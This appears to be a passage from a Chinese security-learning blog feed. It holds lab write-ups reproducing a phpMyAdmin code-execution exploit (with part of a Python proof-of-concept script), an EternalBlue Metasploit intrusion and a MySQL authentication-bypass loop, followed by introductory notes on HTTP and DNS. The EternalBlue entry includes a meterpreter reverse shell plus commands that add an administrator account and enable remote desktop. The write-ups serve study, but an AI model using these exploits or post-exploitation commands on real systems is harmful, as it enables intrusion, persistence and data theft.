class="string">&quot;sql.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;find&quot;</span>: <span class="string">&quot;0/e\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;replaceWith&quot;</span>: payload,</span><br><span class="line">    <span class="string">&quot;columnIndex&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;useRegex&quot;</span>: <span class="string">&quot;on&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Go&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ajax_request&quot;</span>: <span class="string">&quot;true&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">resp = s.post(</span><br><span class="line">    url_to_pma + <span class="string">&quot;/tbl_find_replace.php&quot;</span>, exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">    result = resp.json()[<span class="string">&quot;message&quot;</span>][resp.json()[<span class="string">&quot;message&quot;</span>].find(<span class="string">&quot;&lt;/a&gt;&quot;</span>)+<span class="number">8</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(result):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;result: &quot;</span> + result)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;Exploit failed!\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Try to manually set exploit parameters like --table, --database and --token.\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Remember that servers with PHP version greater than 5.4.6&quot;</span></span><br><span class="line">        <span class="string">&quot; is not exploitable, because of warning about null byte in regexp&quot;</span></span><br><span class="line">    )</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>在目录下新建这个脚本</p><p><img src="/2021/11/12/phpMyAdmin-4-0-x%E2%80%944-6-2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image3.png" alt="image3"></p><p>接着可以调用这个脚本来执行命令</p><p>比如执行ls命令：</p><p><code>python cve-2016-5734.py -u root -p root -d test -c &quot;system(ls)&quot; http://192.168.176.142:8080/</code></p><p>-u是用户 -p是密码，-d是可以写入的数据库，没有就新建一个。-c是待执行的PHP语句，如果没有指定表名，这个POC会创建一个名为prgpwn的表。</p><p><img src="/2021/11/12/phpMyAdmin-4-0-x%E2%80%944-6-2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image4.png" alt="image4"></p><p>作为对比，我们进入源码目录里面查看一下</p><p><img src="/2021/11/12/phpMyAdmin-4-0-x%E2%80%944-6-2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image5.png" alt="image5"></p><p>复现成功！</p>]]></content>
      
      
      <categories>
          
          <category> web安全渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三方软件漏洞， 远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝MS17-010漏洞复现</title>
      <link href="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>EternalBlue（永恒之蓝）据称是方程式组织在其漏洞利用框架中一个针对SMB服务进行攻击的模块，由于其涉及漏洞的影响广泛性及利用稳定性，在被公开以后为破坏性巨大的勒索蠕虫 WannaCry所用而名噪一时。永恒之蓝是指2017年5月13日起，全球范围内爆发的基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p><p>MS17-010是一个安全类型的补丁，MS17-010更新修复了 Microsoft Windows中的漏洞。 如果攻击者向 Microsoft 服务器消息块 1.0 (SMBv1) 服务器发送经特殊设计的消息，则其中最严重的漏洞可能允许远程代码执行。</p><h3 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h3><p><strong>windows 7:</strong></p><p>ip:192.168.176.133</p><p><strong>kali（自带metasploit工具）:</strong></p><p>ip:192.168.176.138</p><p><strong>metasploit:</strong></p><p>Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程。团队合作，在Metasploit和综合报告提出了他们的发现。</p><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a><strong>步骤：</strong></h3><p>打开kali上自带的msfconsole终端</p><p><code>msfconsole</code></p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image1.png" alt="image1"></p><p>在msf终端搜索ms17_010的相关模块</p><p><code>search ms17_010</code></p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image2.png" alt="image2"></p><p>因为是对内网中存在445端口开放的主机进行扫描，所以加载扫描模块</p><p><code>use auxiliary/scanner/smb/smb_ms17_010</code></p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image3.png" alt="image3"></p><p>接着查看当前模块的各项参数信息</p><p><code>show options</code></p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image4.png" alt="image4"></p><p>设置目标IP或网段，我这里设置目标IP地址</p><p><code>set rhosts 192.168.176.133</code></p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image5.png" alt="image5"></p><p>然后设置当前的线程数。不设置则默认为1，扫描速度会很慢。可设置得大一些。</p><p><code>set threads 100</code></p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image6.png" alt="image6"></p><p>参数都设置好之后便开始执行模块</p><p><code>run</code></p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image7.png" alt="image7"></p><p>发现靶机开放了445端口，接着开始我们的进一步渗透，加载ms17-010攻击模块</p><p><code>use exploit/windows/smb/ms17_010_eternalblue</code></p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image8.png" alt="image8"></p><p>并设置我们的攻击载荷，建立反向tcp连接。也是在内网渗透中用的最多的一种。</p><p><code>set payload windows/x64/meterpreter/reverse_tcp</code></p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image9.png" alt="image9"></p><p>接着同上：</p><p><code>show options #查看当前需要陪着的各项参数</code></p><p><code>set rhost 192.168.176.133 #设置目标主机ip</code></p><p><code>set lhost 192.168.176.138 #设置当前主机ip</code></p><p><code>run #执行</code></p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image10.png" alt="image10"></p><p>成功弹回meterpreter会话，这也意味着我们已经渗透成功，拿到了目标主机的shell。</p><p><code>sysinfo #查看目标主机的系统信息。</code></p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image11.png" alt="image11"></p><p><code>screenshot #在目标主机上进行截图</code></p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image12.png" alt="image12"></p><p>截图</p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image13.png" alt="image13"></p><p>接着通过shell对靶机进行控制</p><p>此时输入getuid查看权限得知权限为管理员权限</p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image14.png" alt="image14"></p><p><code>shell #进入windows命令行模式</code></p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image15.png" alt="image15"></p><p><code>chcp 65001 #解除乱码</code></p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image16.png" alt="image16"></p><p>接下来可以创建新的管理员用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">创建新用户smile</span><br><span class="line">net user smile  123456 /add</span><br><span class="line">将用户smile添加至管理员组</span><br><span class="line">net localgroup administrators smile /add</span><br></pre></td></tr></table></figure><p>设置远程桌面端口</p><p><code>reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</code></p><p>开启远程桌面</p><p><code>wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</code></p><p>3389端口已开启</p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image17.png" alt="image17"></p><p>关闭远程桌面</p><p><img src="/2021/11/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image18.png" alt="image18"></p><p>渗透结束！</p>]]></content>
      
      
      <categories>
          
          <category> web安全渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统漏洞， 远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql身份认证绕过漏洞复现</title>
      <link href="/2021/11/11/Mysql%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/11/11/Mysql%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="Mysql-身份认证绕过漏洞（CVE-2012-2122）"><a href="#Mysql-身份认证绕过漏洞（CVE-2012-2122）" class="headerlink" title="Mysql 身份认证绕过漏洞（CVE-2012-2122）"></a>Mysql 身份认证绕过漏洞（CVE-2012-2122）</h3><p>当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。</p><p>受影响版本：</p><ul><li>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.</li><li>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</li></ul><p>参考链接：</p><ul><li><a href="https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/">https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/</a></li><li><a href="https://vulhub.org/#/environments/mysql/CVE-2012-2122/">https://vulhub.org/#/environments/mysql/CVE-2012-2122/</a></li></ul><p>进入靶场所在文件目录，并启动测试环境：</p><p><img src="/2021/11/11/Mysql%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image1.png" alt="image1"></p><p>环境启动后，将启动一个Mysql服务（版本：5.5.23），监听3306端口，通过正常的Mysql客户端，可以直接登录的，正确root密码是123456。</p><p>在我们不知道环境正确密码的情况下，在bash下运行如下命令，在一定数量尝试后便可成功登录：</p><p><code>for i in seq 1 1000; do mysql -uroot -pwrong -h your-ip -P3306 ; done</code></p><p><img src="/2021/11/11/Mysql%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image2.png" alt="image2"></p><p>成功登录！</p><p><img src="/2021/11/11/Mysql%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image3.png" alt="image3"></p>]]></content>
      
      
      <categories>
          
          <category> web安全渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库漏洞，弱口令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础入门——数据包拓展</title>
      <link href="/2021/11/11/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/"/>
      <url>/2021/11/11/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h1 id="01基础入门——数据包拓展"><a href="#01基础入门——数据包拓展" class="headerlink" title="01基础入门——数据包拓展"></a>01基础入门——数据包拓展</h1><h2 id="一、网站解析对应"><a href="#一、网站解析对应" class="headerlink" title="一、网站解析对应"></a>一、网站解析对应</h2><p>涉及到的攻击层面？（源码，搭建平台，系统，网络层等）</p><p>涉及到的安全问题？（目录，敏感文件，弱口令，IP及域名等）</p><h2 id="二、HTTP-S数据包"><a href="#二、HTTP-S数据包" class="headerlink" title="二、HTTP/S数据包"></a>二、HTTP/S数据包</h2><p><img src="/2021/11/11/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/image1.png" alt="image1"></p><p><code>Request请求数据包</code></p><p><code>Response返回数据包</code></p><p><code>proxy代理服务器</code></p><p>HTTP与HTTPS的区别？</p><p><img src="/2021/11/11/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/image2.png" alt="image2"></p><p>HTTP简要通信过程</p><p><img src="/2021/11/11/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/image3.png" alt="image3"></p><p>建立连接—–&gt;发送请求数据包—&gt;返回响应数据包–&gt;关闭连接</p><p>1.浏览器建立与web服务器之间的连接</p><p>2.浏览器将请求数据打包（生成请求数据包〉并发送到web服务器</p><p>3.web服务器将处理结果打包（生成响应数据包)并发送给浏览器</p><p>4.web服务器关j闭连接</p><h2 id="三、Request请求数据包数据格式"><a href="#三、Request请求数据包数据格式" class="headerlink" title="三、Request请求数据包数据格式"></a>三、Request请求数据包数据格式</h2><h3 id="Request请求数据包数据格式"><a href="#Request请求数据包数据格式" class="headerlink" title="Request请求数据包数据格式"></a>Request请求数据包数据格式</h3><ul><li>请求行:请求类型/请求资源路径、协议的版本和类</li><li>请求头:一些键值对，浏览器与web服务器之间都可以发送，特定的某种含义</li><li>空行:请求头与请求体之间用一个空行隔开;</li><li>请求体:要发送的数据(一般post提交会使用);例: user=123&amp;pass=123</li></ul><h3 id="1-请求行"><a href="#1-请求行" class="headerlink" title="1.请求行"></a>1.请求行</h3><p>请求行由三个标记组成：请求方法、请求URL和HTTP版本，他们用空格分享。</p><p>例如GET/index.html HTTP/1.1</p><p>HTTP规划定义了8种可能的请求方法：</p><ul><li>GET:检索URL中标识资源的一个简单请求</li><li>HEAD:与GET方法相同，服务器只返回状态行和头标，并不返回请求文档</li><li>POST:服务器接受被写入客户端输出流中的数据的请求</li><li>PUT:服务器保存请求数据作为指定URL新内容的请求DELETE:服务器删除URL中命令的资源的请求</li><li>OPTIONS:关于服务器支持的请求方法信息的请求</li><li>TRACE: web服务器反馈Http请求和其头标的请求</li><li>CONNECT :已文档化，但当前未实现的一个方法，预留做隧道处理</li></ul><h3 id="⒉-请求头"><a href="#⒉-请求头" class="headerlink" title="⒉.请求头"></a>⒉.请求头</h3><p>由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。</p><ul><li><p>HOST:主机或域名地址</p></li><li><p>Accept:指浏览器或其他客户可以接爱的MIME文件格式。Servlet可以根据它判断并返回适当的文件格式</p></li><li><p>User-Agent:是客户浏览器名称</p></li><li><p>Host:对应网址URL中的Web名称和端口号</p></li><li><p>Accept-Langeuage:指出浏览器可以接受的语言种类，如en或en-us，指英语</p></li><li><p>connection:用来告诉服务器是否可以维持固定的HTTP连接。http是无连接的，HTP/1.1使用Keep-Alive为默认值，这样，当浏览器需要多个文件时此比如一个HTML文件和相关的图形文件)，不需要每次都建立连接</p></li><li><p>Cookie :浏览器用这个属性向服务器发送Cookie。Cookie是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能</p></li><li><p>Referer:表明产生请求的网页URL。如比从网页/icconcept/indexisp中点击一个链接到网页/icwork search，在向服务器发送的GET/icwork/search中的请求中,Referer是<a href="http://hostname:8080/icconcept/index,jsp%E3%80%82%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E8%B7%9F%E8%B8%AAWeb%E8%AF%B7%E6%B1%82%E6%98%AF%E4%BB%8E%E4%BB%80%E4%B9%88%E7%BD%91%E7%AB%99%E6%9D%A5%E7%9A%84">http://hostname:8080/icconcept/index,jsp。这个属性可以用来跟踪Web请求是从什么网站来的</a></p></li><li><p>Content-Type:用来表名request的内容类型。可以用HttpServletRequest的getContentType()方法取得</p></li><li><p>Accept-Charset:指出浏览器可以接受的字符编码。英文浏览器的默认值是ISO-8859-1</p></li><li><p>Acept-Encoding:指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到Web响应之后先解码，然后再检查文件格式</p></li></ul><h3 id="3-空行"><a href="#3-空行" class="headerlink" title="3.空行"></a>3.空行</h3><p>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</p><h3 id="4-请求数据"><a href="#4-请求数据" class="headerlink" title="4.请求数据"></a>4.请求数据</h3><p>使用POST传送，最常使用的是Content-Type和Content-Length头标。</p><h2 id="四、Response返回数据包数据格式"><a href="#四、Response返回数据包数据格式" class="headerlink" title="四、Response返回数据包数据格式"></a>四、Response返回数据包数据格式</h2><p>—个响应由四个部分组成;状态行、响应头标、空行、响应数据。</p><ul><li>·状态行:协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔</li><li>响应头标:包含服务器类型、日期、长度、内容类型等</li><li>空行:响应头与响应体之间用空行隔开</li><li>响应数据:浏览器会将实体内容中的数据取出来，生成相应的页面</li></ul><h3 id="HTTP响应码"><a href="#HTTP响应码" class="headerlink" title="HTTP响应码"></a>HTTP响应码</h3><p>1xx:信息，请求收到，继续处理<br>2xx:成功，行为被成功地接受、理解和采纳<br>3xx:重定向，为了完成请求，必须进—步执行的动作<br>4xx:客户端错误<br>5xx:服务器错误<br>200存在文件</p><p>403存在文件夹<br>3xx均可能存在<br>404不存在文件及文件夹</p><p>500均可能存在</p><h3 id="1-响应头标"><a href="#1-响应头标" class="headerlink" title="1.响应头标"></a>1.响应头标</h3><p>像请求头标—样，它们指出服务器的功能，标识出响应数据的细节。</p><h3 id="2-空行"><a href="#2-空行" class="headerlink" title="2.空行"></a>2.空行</h3><p>最后一个响应头标之后是一个空行，发送回车符和退行，表明服务器以下不再有头标。</p><h3 id="3-响应数据"><a href="#3-响应数据" class="headerlink" title="3.响应数据"></a>3.响应数据</h3><p>HTML文档和图像等，也就是HTML本身。</p><h2 id="五、设计演示案例"><a href="#五、设计演示案例" class="headerlink" title="五、设计演示案例"></a>五、设计演示案例</h2><h3 id="Burpsuite抓包修改测试"><a href="#Burpsuite抓包修改测试" class="headerlink" title="Burpsuite抓包修改测试"></a>Burpsuite抓包修改测试</h3><h3 id="敏感文件扫描工具简要实现"><a href="#敏感文件扫描工具简要实现" class="headerlink" title="敏感文件扫描工具简要实现"></a>敏感文件扫描工具简要实现</h3><p>御剑web目录扫描工具（还有一款铸剑，功能更多），扫描时可以配合wireshark抓包分析（筛选条件：扫描的ip或域名）</p><p><img src="/2021/11/11/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/image4.png" alt="image4"></p><h3 id="第三方检测修改实现XSS攻击"><a href="#第三方检测修改实现XSS攻击" class="headerlink" title="第三方检测修改实现XSS攻击"></a>第三方检测修改实现XSS攻击</h3><p>bp抓包修改信息（比如访问ip.chinaz.com，会看看到你的ip等信息，用bp抓包，比如改user-agent，然后再forward，会发现信息改变）</p><p>例：我进行IP查询时，会显示本机IP信息：</p><p><img src="/2021/11/11/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/image5.png" alt="image5"></p><p>我利用burpsuite抓包然后修改信息：</p><p><img src="/2021/11/11/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/image6.png" alt="image6"></p><h3 id="数据包相关检验对比（APP与直接访问）"><a href="#数据包相关检验对比（APP与直接访问）" class="headerlink" title="数据包相关检验对比（APP与直接访问）"></a>数据包相关检验对比（APP与直接访问）</h3><p>注意如果用电脑访问抓到的app的页面，基本是不成功的，得注意请求头的信息，可以按照抓到的正确的app包的信息改，就可以访问过去。</p><p>CTF或实际应用中部分考题解析（mozhe）</p>]]></content>
      
      
      <categories>
          
          <category> 小迪安全学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全学习，学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础入门——概念名词</title>
      <link href="/2021/11/06/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/"/>
      <url>/2021/11/06/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="01基础入门——概念名词"><a href="#01基础入门——概念名词" class="headerlink" title="01基础入门——概念名词"></a>01基础入门——概念名词</h1><h2 id="一、域名"><a href="#一、域名" class="headerlink" title="一、域名"></a>一、域名</h2><h3 id="1-什么是域名？"><a href="#1-什么是域名？" class="headerlink" title="1.什么是域名？"></a>1.什么是域名？</h3><p>域名(英语: Domain Name)，又称网域，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识(有时也指地理位置)。</p><p>由于IP地址具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名，并通过网域名称系统(DNS,Domain Name System)来将域名和IP地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。</p><p>比如<a href="http://www.baidu.com,这就是一个域名,简单来说就是p不好记,所以有了域名来方便记忆.可以联想到地址和经纬度的关系/">www.baidu.com，这就是一个域名，简单来说就是p不好记，所以有了域名来方便记忆。可以联想到地址和经纬度的关系</a>(上海∶经度121.48 纬度31.22)</p><h3 id="2-域名在哪里注册？"><a href="#2-域名在哪里注册？" class="headerlink" title="2.域名在哪里注册？"></a>2.域名在哪里注册？</h3><p>找个域名注册商的网站(比如阿里、万网)，搜索想要的域名（(由于国内并非所有域名都支持备案，目前提供主流可备案域名有:</p><p><code>.com .cn .com.cn .net .club等</code></p><p>填写域名资料。若你是以公司名义注册域名，则需要填写企业资料、联系人信息;若你是以个人名义注册，请切换到个人栏，填写个人信息。域名英文信息将会根据你填写的中文自动翻译，请核对是否有误，若有误请及时进行修改。<br>确认域名账单。确认域名注册人信息、账单无误后，使用支付宝或微信扫码支付即可完成注册。<br>域名实名验证。因国内法律法规要求，域名注册后需要进行实名认证，通过认证后即可正式生效。若审核有误，请及时进行修改，再次提交审核<br>域名备案及绑定网站。如果你需要在国内上线，则需要进行网站备案。</p><h3 id="3-什么是子域名、二级域名、多级域名？"><a href="#3-什么是子域名、二级域名、多级域名？" class="headerlink" title="3.什么是子域名、二级域名、多级域名？"></a>3.什么是子域名、二级域名、多级域名？</h3><p>例如<a href="http://www.dns0755.net是dns0755.net的子域名,而dns0755.net又是net的子域名.国际顶级域名的子域名叫做二级域名./">www.dns0755.net是dns0755.net的子域名，而dns0755.net又是net的子域名。国际顶级域名的子域名叫做二级域名。</a></p><p>如A.com是一级域名，A.B.com则是二级域名。一级域名较二级域名级别更高，而二级域名则是依附于一级域名下的附属分区域名，即二级域名是一级域名的细分层级。</p><p>通过网址上【.】数星来判断域名层级，有多少【.】就为几级域名，如A.com是一级域名，A.B.com则是二级域名。</p><p>如: baidu.com是百度的顶级域名，zhidao.baidu.com是二级域名，zhidao.zhidao.baidu.com是三(多)级域名，*.baidu.com是泛域名。</p><h3 id="4-域名发现对于安全测试意义？"><a href="#4-域名发现对于安全测试意义？" class="headerlink" title="4.域名发现对于安全测试意义？"></a>4.域名发现对于安全测试意义？</h3><p>进行渗透测试时，其主域名找不到漏洞时，就可以尝试去测试收集到的子域名，有可能测试子域名网站时会有意向不到的效果，然后可以由此横向到主网站。</p><h2 id="二、DNS与CDN"><a href="#二、DNS与CDN" class="headerlink" title="二、DNS与CDN"></a>二、DNS与CDN</h2><h3 id="1-什么是DNS？"><a href="#1-什么是DNS？" class="headerlink" title="1.什么是DNS？"></a>1.什么是DNS？</h3><p>域名系统(英文: Domain Name System，缩写:DNS)是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><h3 id="2-本地HOSTS与DNS的关系？"><a href="#2-本地HOSTS与DNS的关系？" class="headerlink" title="2.本地HOSTS与DNS的关系？"></a>2.本地HOSTS与DNS的关系？</h3><p>Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的P地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。</p><p>需要注意的是，Hosts文件配置的映射是静态的，如果网络上的计算机更改了请及时更新IP地址，否则将不能访问。</p><p>例:先打开cmd终端，输入命令 ping <a href="http://www.baidu.com,得到的结果如下图/">www.baidu.com，得到的结果如下图</a>:</p><p><img src="/2021/11/06/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/image1.png" alt="image1"></p><p>在hosts文件(图中黄色框内为hosts文件绝对路径）最后加上下图红色框内的内容，并ctrl+s保存</p><p><img src="/2021/11/06/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/image2.png" alt="image2"></p><p>再次ping <a href="http://www.baidu.com时会发现解析的ip变为你hosts文件中的了(当然了,访问不了)./">www.baidu.com时会发现解析的ip变为你hosts文件中的了(当然了，访问不了)。</a></p><p><img src="/2021/11/06/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/image3.png" alt="image3"></p><h3 